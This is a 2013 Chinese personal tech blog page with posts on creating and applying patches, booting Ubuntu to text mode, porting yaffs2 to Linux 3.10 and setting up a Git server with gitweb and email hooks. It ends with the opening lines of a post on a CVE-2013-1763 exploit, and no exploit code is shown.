        <p>在团队开发的过程中，经常需要生成patch，或者打上别人提供的patch，那么一般情况是如何操作的呢。</p>
<p>首先生成patch需要有两个工程，一个修改前的A工程，一个修改后的B工程。</p>
<p>使用linux命令diff就可以生成patch了。格式如下：</p>
<pre><code>diff&amp;nbsp;-Naur&amp;nbsp;path/to/A_Project&amp;nbsp;&amp;nbsp;path/to/B_Project&amp;nbsp;&amp;gt;&amp;nbsp;Project.patch`&lt;/pre&gt; 

&amp;nbsp; &amp;nbsp;**-N**&amp;nbsp;选项确保补丁文件将正确地处理已经创建或删除文件的情况。

&amp;nbsp; &amp;nbsp;**-a** 将所有文件都当作文本文件处理。

&amp;nbsp; &amp;nbsp;**-u**&amp;nbsp;输出每个修改前后的3行，也可以用-u5等指定输出更多上下文。

&amp;nbsp; &amp;nbsp;**-r**&amp;nbsp;递归。设置后diff会将两个不同版本源代码目录中的所有对应文件全部都进行一次比较，包括子目录文件。

生成patch以后，在修改前A工程根目录下使用patch命令打上patch。

&lt;pre class=&quot;brush:shell; toolbar: true; auto-links: false;&quot;&gt;`$&amp;nbsp;cd&amp;nbsp;path/to/A_Project
$&amp;nbsp;patch&amp;nbsp;-p1&amp;nbsp;&amp;lt;&amp;nbsp;Project.patch`&lt;/pre&gt; 

**&amp;nbsp; &amp;nbsp; -p Num**&amp;nbsp;忽略几层文件夹

&lt;span style=&quot;line-height:1.5;font-size:10pt;&quot;&gt;为了解释&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;line-height:1.5;font-size:10pt;&quot;&gt;-p&lt;/span&gt;&lt;span style=&quot;line-height:1.5;font-size:10pt;&quot;&gt;&amp;nbsp;参数，需要看看如下patch文件片段：&lt;/span&gt; 

&lt;pre class=&quot;diff source-diff&quot;&gt;`---&amp;nbsp;old/modules/pcitable&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Mon&amp;nbsp;Sep&amp;nbsp;27&amp;nbsp;11:03:56&amp;nbsp;1999&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;+++&amp;nbsp;new/modules/pcitable&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Tue&amp;nbsp;Dec&amp;nbsp;19&amp;nbsp;20:05:41&amp;nbsp;2000`&lt;/pre&gt; 

如果使用参数&amp;nbsp;-p0，那就表示从当前目录找一个叫做old的文件夹，再在它下面寻找&amp;nbsp;modules/pcitable&amp;nbsp;文件来执行patch操作。
 而如果使用参数&amp;nbsp;-p1，那就表示忽略第一层目录（即不管old），从当前目录寻找&amp;nbsp;modules&amp;nbsp;的文件夹，再在它下面找pcitable。

如果要取消补丁做出的更改，恢复旧版本，在A工程的根目录下执行以下命令，A工程就会恢复成没有打patch的样子：

&lt;pre class=&quot;bash source-bash&quot;&gt;`$&amp;nbsp;patch&amp;nbsp;-RE&amp;nbsp;-p0&amp;nbsp;&amp;lt;&amp;nbsp;Project.patch`&lt;/pre&gt; 

由Git管理的工程处理patch的方法：

【生成patch】

分支master 上是没修改前的，分支patch 上是修改以后的打patch的。

1\. 先切换到 patch分支

&lt;pre class=&quot;brush:shell; toolbar: true; auto-links: false;&quot;&gt;`git&amp;nbsp;checkout&amp;nbsp;patch`&lt;/pre&gt; 

2\. 生成patch

&lt;pre class=&quot;brush:shell; toolbar: true; auto-links: false;&quot;&gt;`git&amp;nbsp;format-patch&amp;nbsp;-M&amp;nbsp;master`&lt;/pre&gt; 

&lt;span style=&quot;line-height:1.5;&quot;&gt;会生成一个文件名如：0002-Release-version-1.4.6.patch 的patch文件&lt;/span&gt; 

&lt;span style=&quot;line-height:1.5;&quot;&gt;【合并patch】&lt;/span&gt; 

拿到patch以后，执行下面的命令：

&lt;pre class=&quot;brush:shell; toolbar: true; auto-links: false;&quot;&gt;`git&amp;nbsp;am&amp;nbsp;0002-Release-version-1.4.6.patch`&lt;/pre&gt; 

如果不想直接commit，那么可以用下面这个命令打patch：

&lt;pre class=&quot;brush:shell; toolbar: true; auto-links: false;&quot;&gt;`patch&amp;nbsp;-p1&amp;nbsp;&amp;lt;&amp;nbsp;0002-Release-version-1.4.6.patch
</code></pre><p>然后手动commit。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://fengguoqing.github.io/2013/12/02/生成和打上patch的方法/" data-id="cjafimiwc0000v6j182tctgh6" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/教程/">教程</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Ubuntu默认启动到文本界面" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2013/11/07/Ubuntu默认启动到文本界面/" class="article-date">
  <time datetime="2013-11-07T02:50:18.000Z" itemprop="datePublished">2013-11-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/11/07/Ubuntu默认启动到文本界面/">Ubuntu默认启动到文本界面</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p> 使用虚拟机安装ubuntu之后感觉机器有点吃力，为了缓解这种压力，直接启动到文本界面，然后使用Xshell或者putty等工具登录，相当的happy。设置方法如下： </p>
<pre><code>$ sudo vim /etc/default/grub
- GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet splash&quot;
+ GRUB_CMDLINE_LINUX_DEFAULT=&quot;text&quot;
$ sudo update-grub
$ sudo reboot
</code></pre><p> &nbsp;重启完之后就直接进入了文件界面，虚拟机的开销就会减小很多了。 </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://fengguoqing.github.io/2013/11/07/Ubuntu默认启动到文本界面/" data-id="cjafik5f90000t5j1lwvnuu5q" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/日常记录/">日常记录</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-基于linux-3-10的yaffs2移植" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2013/11/02/基于linux-3-10的yaffs2移植/" class="article-date">
  <time datetime="2013-11-02T05:07:41.000Z" itemprop="datePublished">2013-11-02</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/11/02/基于linux-3-10的yaffs2移植/">基于linux 3.10的yaffs2移植</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>最近想起来还有一块mini2440的开发板很久没有使用了，所以想移植一个基于linux3.10的linux系统，但是在移植yaffs2文件系统的时候出现了一些问题，我将其记录下来给其他同学解决同样的问题提供帮助。</p>
<p>1. 首先通过git下载yaffs2代码。然后进入yaffs2文件夹中执行patch-ker.sh，给linux源代码打上patch。</p>
<pre><code>$ git clone git://www.aleph1.co.uk/yaffs2
$ cd yaffs2/
$ ./patch-ker.sh c m ../linux3.10-mini2440`&lt;/pre&gt; 

2\. 然后在linux的源代码fs中多了一个yaffs2的文件夹，到此yaffs2文件系统就已经添加到linux3.10中了。在Linux内核源代码根目录运行：make menuconfig，移动上下按键进行配置：

&lt;pre&gt;`File Systems
    ---&amp;gt; Miscellaneous filesystems
        ---&amp;gt; [*]YAFFS2 file system support`&lt;/pre&gt; 并按空格选中它，这样我们就在内核中添加了yaffs2文件系统的支持，按“Exit”退出内核配置。 

3\. 编译linux源代码。

&lt;pre&gt;`$ make zImage
scripts/kconfig/conf --silentoldconfig Kconfig
  CHK     include/generated/uapi/linux/version.h
  CHK     include/generated/utsrelease.h
make[1]: `include/generated/mach-types.h&apos; is up to date.
  CALL    scripts/checksyscalls.sh
  CC      scripts/mod/devicetable-offsets.s
  GEN     scripts/mod/devicetable-offsets.h
  HOSTCC  scripts/mod/file2alias.o
  HOSTLD  scripts/mod/modpost
  CHK     include/generated/compile.h
  CC      fs/yaffs2/yaffs_ecc.o
  CC      fs/yaffs2/yaffs_vfs.o
fs/yaffs2/yaffs_vfs.c: In function &apos;yaffs_proc_debug_write&apos;:
fs/yaffs2/yaffs_vfs.c:3304: warning: comparison of distinct pointer types lacks a cast
fs/yaffs2/yaffs_vfs.c: In function &apos;init_yaffs_fs&apos;:
fs/yaffs2/yaffs_vfs.c:3398: error: implicit declaration of function &apos;create_proc_entry&apos;
fs/yaffs2/yaffs_vfs.c:3399: warning: assignment makes pointer from integer without a cast
fs/yaffs2/yaffs_vfs.c:3402: error: dereferencing pointer to incomplete type
fs/yaffs2/yaffs_vfs.c:3403: error: dereferencing pointer to incomplete type
fs/yaffs2/yaffs_vfs.c:3404: error: dereferencing pointer to incomplete type
make[2]: *** [fs/yaffs2/yaffs_vfs.o] Error 1
make[1]: *** [fs/yaffs2] Error 2
make: *** [fs] Error 2`&lt;/pre&gt; 

编译fs/yaffs2/yaffs_vfs.c时出现错误，function &apos;create_proc_entry&apos;没有申明。Google之后才知道原来这个接口在linux-3.10被删除了，应该使用proc_create代替。

参考：[What&apos;s coming in 3.10, part 2](https://lwn.net/Articles/549737/)

4\. 修改fs/yaffs2/yaffs_vfs.c

&lt;pre&gt;`@@ -3384,12 +3384,6 @@ static struct file_system_to_install fs_to_install[] = {
        {NULL, 0}
 };

+static const struct file_operations yaffs_fops = {
+        .owner = THIS_MODULE,
+        .read = yaffs_proc_read,
+        .write = yaffs_proc_write,
+};
+
 static int __init init_yaffs_fs(void)
 {
        int error = 0;
@@ -3401,9 +3395,9 @@ static int __init init_yaffs_fs(void)
        mutex_init(&amp;amp;yaffs_context_lock);

        /* Install the proc_fs entries */
+       my_proc_entry = proc_create(&quot;yaffs&quot;,
+                                         S_IRUGO | S_IFREG, YPROC_ROOT, &amp;amp;yaffs_fops);
+#if 0
-       my_proc_entry = create_proc_entry(&quot;yaffs&quot;,
-                                         S_IRUGO | S_IFREG, YPROC_ROOT);
-
        if (my_proc_entry) {
                my_proc_entry-&amp;gt;write_proc = yaffs_proc_write;
                my_proc_entry-&amp;gt;read_proc = yaffs_proc_read;
@@ -3411,7 +3405,7 @@ static int __init init_yaffs_fs(void)
        } else {
                return -ENOMEM;
         }
+#endif
-
        /* Now add the file system entries */

        fsinst = fs_to_install;`&lt;/pre&gt; 

5\. 修改之后保存，然后再编译就可以成功了。

&lt;pre&gt;`$ make zImage
  CHK     include/generated/uapi/linux/version.h
  CHK     include/generated/utsrelease.h
make[1]: `include/generated/mach-types.h&apos; is up to date.
  CALL    scripts/checksyscalls.sh
  CC      scripts/mod/devicetable-offsets.s
  GEN     scripts/mod/devicetable-offsets.h
  HOSTCC  scripts/mod/file2alias.o
  HOSTLD  scripts/mod/modpost
  CHK     include/generated/compile.h
  CC      fs/yaffs2/yaffs_vfs.o
fs/yaffs2/yaffs_vfs.c: In function &apos;yaffs_proc_debug_write&apos;:
fs/yaffs2/yaffs_vfs.c:3304: warning: comparison of distinct pointer types lacks a cast
fs/yaffs2/yaffs_vfs.c: At top level:
fs/yaffs2/yaffs_vfs.c:3389: warning: initialization from incompatible pointer type
fs/yaffs2/yaffs_vfs.c:3390: warning: initialization from incompatible pointer type
  CC      fs/yaffs2/yaffs_guts.o
  CC      fs/yaffs2/yaffs_checkptrw.o
  CC      fs/yaffs2/yaffs_packedtags1.o
  CC      fs/yaffs2/yaffs_packedtags2.o
  CC      fs/yaffs2/yaffs_nand.o
  CC      fs/yaffs2/yaffs_tagscompat.o
  CC      fs/yaffs2/yaffs_tagsmarshall.o
  CC      fs/yaffs2/yaffs_mtdif.o
  CC      fs/yaffs2/yaffs_nameval.o
  CC      fs/yaffs2/yaffs_attribs.o
  CC      fs/yaffs2/yaffs_allocator.o
  CC      fs/yaffs2/yaffs_yaffs1.o
  CC      fs/yaffs2/yaffs_yaffs2.o
  CC      fs/yaffs2/yaffs_bitmap.o
  CC      fs/yaffs2/yaffs_summary.o
  CC      fs/yaffs2/yaffs_verify.o
  LD      fs/yaffs2/yaffs.o
  LD      fs/yaffs2/built-in.o
  LD      fs/built-in.o
  LINK    vmlinux
  LD      vmlinux.o
  MODPOST vmlinux.o
  GEN     .version
  CHK     include/generated/compile.h
  UPD     include/generated/compile.h
  CC      init/version.o
  LD      init/built-in.o
  KSYM    .tmp_kallsyms1.o
  KSYM    .tmp_kallsyms2.o
  LD      vmlinux
  SORTEX  vmlinux
  SYSMAP  System.map
  OBJCOPY arch/arm/boot/Image
  Kernel: arch/arm/boot/Image is ready
  GZIP    arch/arm/boot/compressed/piggy.gzip
  AS      arch/arm/boot/compressed/piggy.gzip.o
  LD      arch/arm/boot/compressed/vmlinux
  OBJCOPY arch/arm/boot/zImage
  Kernel: arch/arm/boot/zImage is ready
</code></pre>
      
    </div>
    <footer class="article-footer">
      <a data-url="https://fengguoqing.github.io/2013/11/02/基于linux-3-10的yaffs2移植/" data-id="cjafiktbc0000tpj1aumtg35c" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux移植/">linux移植</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-如何架设Git服务器" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2013/08/29/如何架设Git服务器/" class="article-date">
  <time datetime="2013-08-29T02:49:10.000Z" itemprop="datePublished">2013-08-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/08/29/如何架设Git服务器/">如何架设Git服务器</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>在开发的过程中往往需要一个git服务器来管理和保存代码，如何自己架设一个git服务器呢，方法很简单，这里介绍一下如何架设git服务器，搭建gitweb和push代码之后发送邮件通知组内成员。</p>
<p><span id="OSC_h4_1"></span></p>
<h4 id="1-架设Git服务器"><a href="#1-架设Git服务器" class="headerlink" title="1. 架设Git服务器"></a>1. 架设Git服务器</h4><p>我们以Ubuntu为例。首先，在git服务器上<span style="line-height: 1.5; font-size: 10pt;">创建一个名为 ‘git’ 的用户，并为其创建一个.ssh&nbsp;目录。并将其权限设置为仅git用户有读写权限</span> </p>
<pre><code>$&amp;nbsp;sudo&amp;nbsp;adduser&amp;nbsp;git
$&amp;nbsp;su&amp;nbsp;git
$&amp;nbsp;cd
$&amp;nbsp;mkdir&amp;nbsp;.ssh
$&amp;nbsp;chmod&amp;nbsp;700&amp;nbsp;.ssh`&lt;/pre&gt; 

接下来，把开发者的 SSH 公钥添加到这个用户的&amp;nbsp;authorized_keys&amp;nbsp;文件中。假设你通过电邮收到了几个公钥并存到了临时文件里。重复一下，公钥大致看起来是这个样子：

&lt;pre&gt;`$&amp;nbsp;cat&amp;nbsp;/tmp/id_rsa.john.pub
ssh-rsa&amp;nbsp;AAAAB3NzaC1yc2EAAAADAQABAAABAQCB007n/ww+ouN4gSLKssMxXnBOvf9LGt4L
ojG6rs6hPB09j9R/T17/x4lhJA0F3FR1rP6kYBRsWj2aThGw6HXLm9/5zytK6Ztg3RPKK+4k
Yjh6541NYsnEAZuXz0jTTyAUfrtU3Z5E003C4oxOj6H0rfIF1kKI9MAQLMdpGW1GYEIgS9Ez
Sdfd8AcCIicTDWbqLAcU4UpkaX8KyGlLwsNuuGztobF8m72ALC/nLF6JLtPofwFBlgc+myiv
O7TCUSBdLQlgMVOFq1I2uPWQOkOWQAHukEOmfjy2jctxSDBQ220ymjaNsHT4kgtZg2AYYgPq
dAv8JggJICUvax2T9va5&amp;nbsp;gsg-keypair`&lt;/pre&gt; 

只要把它们逐个追加到&amp;nbsp;authorized_keys&amp;nbsp;文件尾部即可，同时将authorized_keys设置为仅git用户有读写权限。

&lt;pre&gt;`$&amp;nbsp;cat&amp;nbsp;/tmp/id_rsa.john.pub&amp;nbsp;&amp;gt;&amp;gt;&amp;nbsp;~/.ssh/authorized_keys
$&amp;nbsp;cat&amp;nbsp;/tmp/id_rsa.josie.pub&amp;nbsp;&amp;gt;&amp;gt;&amp;nbsp;~/.ssh/authorized_keys
$&amp;nbsp;cat&amp;nbsp;/tmp/id_rsa.jessica.pub&amp;nbsp;&amp;gt;&amp;gt;&amp;nbsp;~/.ssh/authorized_keys
$&amp;nbsp;chmod&amp;nbsp;600&amp;nbsp;~/.ssh/authorized_keys`&lt;/pre&gt; 

现在可以用&amp;nbsp;--bare&amp;nbsp;选项运行&amp;nbsp;git init&amp;nbsp;来建立一个裸仓库，这会初始化一个不包含工作目录的仓库。

&lt;pre&gt;`$&amp;nbsp;cd&amp;nbsp;/opt/git
$&amp;nbsp;mkdir&amp;nbsp;project.git
$&amp;nbsp;cd&amp;nbsp;project.git
$&amp;nbsp;git&amp;nbsp;--bare&amp;nbsp;init`&lt;/pre&gt; 

这时，Join，Josie 或者 Jessica 就可以把它加为远程仓库，推送一个分支，从而把第一个版本的项目文件上传到仓库里了。值得注意的是，每次添加一个新项目都需要通过 shell 登入主机并创建一个裸仓库目录。我们不妨以&amp;nbsp;gitserver&amp;nbsp;作为&amp;nbsp;git&amp;nbsp;用户及项目仓库所在的主机名。如果在网络内部运行该主机，并在 DNS 中设定&amp;nbsp;gitserver&amp;nbsp;指向该主机，那么以下这些命令都是可用的：

&lt;pre&gt;`#&amp;nbsp;在&amp;nbsp;John&amp;nbsp;的电脑上
$&amp;nbsp;cd&amp;nbsp;myproject
$&amp;nbsp;git&amp;nbsp;init
$&amp;nbsp;git&amp;nbsp;add&amp;nbsp;.
$&amp;nbsp;git&amp;nbsp;commit&amp;nbsp;-m&amp;nbsp;&apos;initial&amp;nbsp;commit&apos;
$&amp;nbsp;git&amp;nbsp;remote&amp;nbsp;add&amp;nbsp;origin&amp;nbsp;git@gitserver:/opt/git/project.git
$&amp;nbsp;git&amp;nbsp;push&amp;nbsp;origin&amp;nbsp;master`&lt;/pre&gt; 

这样，其他人的克隆和推送也一样变得很简单：

&lt;pre&gt;`$&amp;nbsp;git&amp;nbsp;clone&amp;nbsp;git@gitserver:/opt/git/project.git
$&amp;nbsp;vim&amp;nbsp;README
$&amp;nbsp;git&amp;nbsp;commit&amp;nbsp;-am&amp;nbsp;&apos;fix&amp;nbsp;for&amp;nbsp;the&amp;nbsp;README&amp;nbsp;file&apos;
$&amp;nbsp;git&amp;nbsp;push&amp;nbsp;origin&amp;nbsp;master`&lt;/pre&gt; 

用这个方法可以很快捷地为少数几个开发者架设一个可读写的 Git 服务。

作为一个额外的防范措施，你可以用 Git 自带的&amp;nbsp;git-shell&amp;nbsp;工具限制&amp;nbsp;git&amp;nbsp;用户的活动范围。只要把它设为&amp;nbsp;git&amp;nbsp;用户登入的 shell，那么该用户就无法使用普通的 bash 或者 csh 什么的 shell 程序。编辑/etc/passwd&amp;nbsp;文件：

&lt;pre&gt;`$&amp;nbsp;sudo&amp;nbsp;vim&amp;nbsp;/etc/passwd`&lt;/pre&gt; 

在文件末尾，你应该能找到类似这样的行：

&lt;pre&gt;`git:x:1000:1000::/home/git:/bin/sh`&lt;/pre&gt; 

把&amp;nbsp;bin/sh&amp;nbsp;改为&amp;nbsp;/usr/bin/git-shell&amp;nbsp;（或者用&amp;nbsp;which git-shell&amp;nbsp;查看它的实际安装路径）。该行修改后的样子如下：

&lt;pre&gt;`git:x:1000:1000::/home/git:/usr/bin/git-shell`&lt;/pre&gt; 

现在&amp;nbsp;git&amp;nbsp;用户只能用 SSH 连接来推送和获取 Git 仓库，而不能直接使用主机 shell。尝试普通 SSH 登录的话，会看到下面这样的拒绝信息：

&lt;pre&gt;`$&amp;nbsp;ssh&amp;nbsp;git@gitserver
fatal:&amp;nbsp;What&amp;nbsp;do&amp;nbsp;you&amp;nbsp;think&amp;nbsp;I&amp;nbsp;am?&amp;nbsp;A&amp;nbsp;shell?
Connection&amp;nbsp;to&amp;nbsp;gitserver&amp;nbsp;closed.`&lt;/pre&gt; 

这里提供的方法，组内所有成员对project都有读写权限，也就是说每个分支都可以push代码，如果需要更加细致的权限控制，请使用[Gitosis](http://git-scm.com/book/zh/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84-Git-Gitosis)或者[Gitolite](http://git-scm.com/book/zh/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84-Git-Gitolite)。

&lt;span id=&quot;OSC_h4_2&quot;&gt;&lt;/span&gt;

#### 2\. 搭建Gitweb

安装gitweb之后就可以通过网站访问我们的项目了。就像&lt;span style=&quot;font-family: Courier,monospace; font-size: 14px; line-height: 18px;&quot;&gt;[http://git.kernel.org](http://git.kernel.org)一样显示了&lt;/span&gt; 

首先需要安装Gitweb，如果没有安装apache，那么直接安装Gitweb，也会将apache2安装的。

&lt;pre class=&quot;brush:cpp; toolbar: true; auto-links: false;&quot;&gt;`$&amp;nbsp;sudo&amp;nbsp;apt-get&amp;nbsp;install&amp;nbsp;gitweb&amp;nbsp;apache2`&lt;/pre&gt; 

安装完成之后，我们只需要修改一下配置文件，将/etc/gitweb.conf文件中的$projectroot修改为放工程文件的目录。

&lt;pre class=&quot;brush:cpp; toolbar: true; auto-links: false;&quot;&gt;`$&amp;nbsp;vim&amp;nbsp;/etc/gitweb.conf
#&amp;nbsp;path&amp;nbsp;to&amp;nbsp;git&amp;nbsp;projects&amp;nbsp;(&amp;lt;project&amp;gt;.git)
$projectroot&amp;nbsp;=&amp;nbsp;&quot;/opt/git&quot;;`&lt;/pre&gt; 

至此gitweb就可以使用了，现在可以通过http://[git_server_IP]/gitweb访问了。

&lt;span id=&quot;OSC_h4_3&quot;&gt;&lt;/span&gt;

#### 3\. Push之后发送邮件通知

当组内成员push代码到服务器上之后，会自动发送邮件通知组内所有人员，该次push的具体内容是什么。具体配置方法：

一般在安装Git的时候发送邮件的脚本/usr/share/git-core/contrib/hooks/post-receive-email已经存在了，首先要修改所有者和执行权限，并且安装sendmail。

&lt;pre class=&quot;brush:cpp; toolbar: true; auto-links: false;&quot;&gt;`$&amp;nbsp;sudo&amp;nbsp;chown&amp;nbsp;git:git&amp;nbsp;post-receive-email
$&amp;nbsp;sudo&amp;nbsp;chmod&amp;nbsp;755&amp;nbsp;post-receive-email
$&amp;nbsp;sudo&amp;nbsp;apt-get&amp;nbsp;install&amp;nbsp;sendmail`&lt;/pre&gt; 

然后到切换到工程目录下的hooks中，添加 post-receive软链接指向 /usr/share/git-core/contrib/hooks/ post-receive-email。

&lt;pre class=&quot;brush:cpp; toolbar: true; auto-links: false;&quot;&gt;`$&amp;nbsp;cd&amp;nbsp;/opt/git/project.git/hooks
$&amp;nbsp;ln&amp;nbsp;-s&amp;nbsp;/usr/share/git-core/contrib/hooks/post-receive-email&amp;nbsp;post-receive`&lt;/pre&gt; 

最后修改工程目录中的config文件即可。mailinglist是邮件列表， &lt;span style=&quot;line-height: 1.5; font-size: 10pt;&quot;&gt;envelopesender是发件人的邮箱，&lt;/span&gt; 

&lt;pre class=&quot;brush:cpp; toolbar: true; auto-links: false;&quot;&gt;`$&amp;nbsp;vim&amp;nbsp;/opt/git/project.git/config
[core]
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;repositoryformatversion&amp;nbsp;=&amp;nbsp;0
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;filemode&amp;nbsp;=&amp;nbsp;true
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;bare&amp;nbsp;=&amp;nbsp;true

[hooks]
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;mailinglist&amp;nbsp;=&amp;nbsp;&quot;example@gmail.com,&amp;nbsp;example2@gmail.com&quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;#&amp;nbsp;收件人列表
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;envelopesender&amp;nbsp;=&amp;nbsp;project.git@example.com&amp;nbsp;&amp;nbsp;#&amp;nbsp;送件人地址
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;emailprefix&amp;nbsp;=&amp;nbsp;&quot;[Project&amp;nbsp;commit]&amp;nbsp;&quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;#&amp;nbsp;邮件标题前缀
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;showrev&amp;nbsp;=&amp;nbsp;&quot;git&amp;nbsp;show&amp;nbsp;-C&amp;nbsp;%s;&amp;nbsp;echo&quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;#&amp;nbsp;不只显示有变化的文件，同时也显示改变的内容`&lt;/pre&gt; 

为了使邮件显示的更清楚，还要修改一下工程目录当中的description文件，在description文件中，默认第一行是项目名称，所以要在第一行填入该项目的名称，这个在邮件中会有显示。

&lt;pre class=&quot;brush:cpp; toolbar: true; auto-links: false;&quot;&gt;`$&amp;nbsp;vim&amp;nbsp;/opt/git/project.git/description
Project_A`&lt;/pre&gt; 

我们收到邮件的标题是这样的：

&lt;pre class=&quot;brush:html; toolbar: true; auto-links: false;&quot;&gt;`[Project&amp;nbsp;commit]&amp;nbsp;Project_A&amp;nbsp;branch&amp;nbsp;master&amp;nbsp;updated.&amp;nbsp;8811b83e1afb373cbe30d5bc25683d74ace2917c`&lt;/pre&gt; 

有时候我们会发现启动和发送sendmail都相当慢，甚至要等两三分钟，完全不能忍，最后通过不断的测试，解决了这个问题，主要是要修改/etc/hosts。例如我的发件人的域是example.com，hostname是desktop，那么就应该这样修改：

&lt;pre class=&quot;brush:xml;toolbar: true; auto-links: false;&quot;&gt;`127.0.0.1&amp;nbsp;&amp;nbsp;example.com&amp;nbsp;localhost&amp;nbsp;desktop`&lt;/pre&gt; 

改完之后重启sendmail服务:

&lt;pre class=&quot;brush:shell;toolbar: true; auto-links: false;&quot;&gt;`service&amp;nbsp;sendmail&amp;nbsp;restart
</code></pre><p>然后你就会发现邮件发的那是刷刷滴！</p>
<p>至此，我们的Git服务器就已经搭建完成了，和你的小伙伴一起快乐的coding吧！</p>
<p><span id="OSC_h4_4"></span></p>
<h4 id="4-参考链接"><a href="#4-参考链接" class="headerlink" title="4. 参考链接"></a>4. 参考链接</h4><p>&nbsp;<a href="http://git-scm.com/book/zh/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84-Git-%E6%9E%B6%E8%AE%BE%E6%9C%8D%E5%8A%A1%E5%99%A8" target="_blank" rel="noopener">http://git-scm.com/book/zh/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84-Git-%E6%9E%B6%E8%AE%BE%E6%9C%8D%E5%8A%A1%E5%99%A8</a> </p>
<p><a href="http://josephj.com/entry.php?id=346" target="_blank" rel="noopener">http://josephj.com/entry.php?id=346</a> </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://fengguoqing.github.io/2013/08/29/如何架设Git服务器/" data-id="cjafim3tf0000uvj1mcfp1j60" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/教程/">教程</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-linux-kernel-本地提权漏洞CVE-2013-1763-exploit-代码分析" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2013/08/22/linux-kernel-本地提权漏洞CVE-2013-1763-exploit-代码分析/" class="article-date">
  <time datetime="2013-08-22T06:07:12.000Z" itemprop="datePublished">2013-08-22</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/08/22/linux-kernel-本地提权漏洞CVE-2013-1763-exploit-代码分析/">linux kernel 本地提权漏洞CVE-2013-1763 exploit 代码分析</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p> kernel 最近出了一个新的本地提权安全漏洞<a href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-1763" target="_blank" rel="noopener">CVE-2013-1763</a>，影响范围比较广泛，ubuntu，Arch，fedora都受到其影响，漏洞刚公布就有牛人发布了利用该漏洞获取root权限的攻击代码，下面会分析该代码是如何获取root权限的。 </p>
<p> 首先对<a href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-1763" target="_blank" rel="noopener">CVE-2013-1763</a>这个安全漏洞简单介绍一下。 </p>
<p><span id="OSC_h4_1"></span></p>
